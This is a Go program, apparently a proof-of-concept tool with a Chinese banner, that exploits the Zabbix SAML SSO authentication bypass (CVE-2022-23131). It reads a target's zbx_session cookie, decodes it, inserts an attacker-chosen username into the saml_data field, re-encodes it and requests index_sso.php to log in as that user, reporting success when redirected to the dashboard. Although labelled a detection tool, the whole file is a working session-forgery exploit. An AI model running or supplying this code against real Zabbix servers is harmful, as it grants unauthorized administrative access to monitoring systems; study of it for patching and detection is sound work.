package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

func Banner() {
	banner := `
   ______     _______     ____   ___ ____  ____      ____  _____ _ _____ _
  / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \|___ // |___ // |
 | |    \ \ / /|  _| _____ __) | | | |__) | __) |____ __) | |_ \| | |_ \| |
 | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/ ___) | |___) | |
  \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|____/|_|____/|_|

                     一键检测工具 `
	print(banner)
}

func check(targetUrl string, targetsession string) string {
	var build strings.Builder
	build.WriteString("zbx_session=")
	build.WriteString(targetsession)
	zabbix_cookie := build.String()
	//proxyUrl, err := url.Parse("http://127.0.0.1:8080")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	//	Proxy:           http.ProxyURL(proxyUrl),
	}
	client := &http.Client{Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequest("GET", targetUrl+"/index_sso.php", nil)
	req.Header.Add("cookie", zabbix_cookie)
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, houzidiandian) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.53 ")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6")
	req.Header.Add("Connection", "close")
	if err != nil {
		print(err)
	}

	resp, err := client.Do(req)
	result := "不存在漏洞！登陆失败"
	flag := "zabbix.php?action=dashboard.view"
	if value, ok := resp.Header["Location"]; ok {
		fmt.Println(value)
		location_to := string(resp.Header["Location"][0])
		if flag == location_to {
			result := "存在漏洞！登陆成功"
			return result
		}
	}
	return result
}

func zbx_session(targetUrl string, targetUsername string) string {
	//proxyUrl, err := url.Parse("http://127.0.0.1:7890")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	//	Proxy: http.ProxyURL(proxyUrl),
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Get(targetUrl + "/")
	if err != nil {
		log.Fatalln(err)
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
		}
	}(resp.Body)

	zabbixSession := resp.Header["Set-Cookie"][0]
	re := regexp.MustCompile(`zbx_session=\s*(.*?)\s*; `)
	match := re.FindAllStringSubmatch(zabbixSession, -1)
	var lgd = ""
	for _, v := range match {
		lgd = v[1]
	}
	session_base64, err := url.QueryUnescape(lgd)
	lyt, err := base64.StdEncoding.DecodeString(session_base64)
	re1 := regexp.MustCompile(`sign":"\s*(.*?)\s*"`)
	match1 := re1.FindAllStringSubmatch(string(lyt), -1)
	var lgd1 = ""
	for _, v := range match1 {
		lgd1 = v[1]
	}
	var data map[string]interface{}
	err = json.Unmarshal([]byte(lyt), &data)
	zabbix_string := "{\"saml_data\":{\"username_attribute\":" + "\"" + targetUsername + "\"}" + ",\"" +
		"sessionid\":\"" + (data["sessionid"]).(string) + "\"," + "\"sign\":\"" + lgd1 + "\"}"
	zabbix_cookie := base64.StdEncoding.EncodeToString(([]byte(zabbix_string)))
	zabbix_set_cookie := url.QueryEscape(zabbix_cookie)
	return zabbix_set_cookie

}

func main() {
	target_url := flag.String("u", "", "目标地址或域名")
	username := flag.String("a", "", "指定用户名")
	flag.Parse()
	Banner()
	fmt.Println("\r\n")
	zbx_session := zbx_session(*target_url,*username)
	fmt.Print("生成的zbx_session值为：",zbx_session)
	fmt.Println("\r")
	result := check(*target_url,zbx_session)
	fmt.Println("正在使用生成的zbx_session登陆后台......\r")
	fmt.Println(result)
}
